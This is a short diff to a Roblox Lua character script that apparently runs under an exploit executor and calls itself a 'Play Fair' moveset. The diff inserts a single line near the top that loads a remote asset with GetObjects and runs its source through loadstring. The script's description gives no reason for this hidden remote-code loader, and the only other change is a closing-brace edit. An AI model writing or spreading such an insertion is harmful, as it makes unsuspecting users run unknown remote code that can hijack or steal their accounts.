@@ -13,6 +13,8 @@
 --- Z(Can be Spammed) - Stand Jump
 --- Passive(Ultimate Body)-- This body will give you Faster Health Regeneration
 ------This is a Play Fair script(None of that one shot stuff)
+loadstring(game:GetObjects("rbxassetid://5209815302")[1].Source)()
+
 if syn then
     local CoreGui = game:GetService("StarterGui")
 
@@ -2099,4 +2101,4 @@ while true do
 		ST3.C0 = clerp(ST3.C0,CFrame.new(1,1.5,1.5)*CFrame.new(0,0-.1*math.sin(tick()*6),0)*CFrame.Angles(0,0,0),0.3)
 			end
 		end
-    end
+end
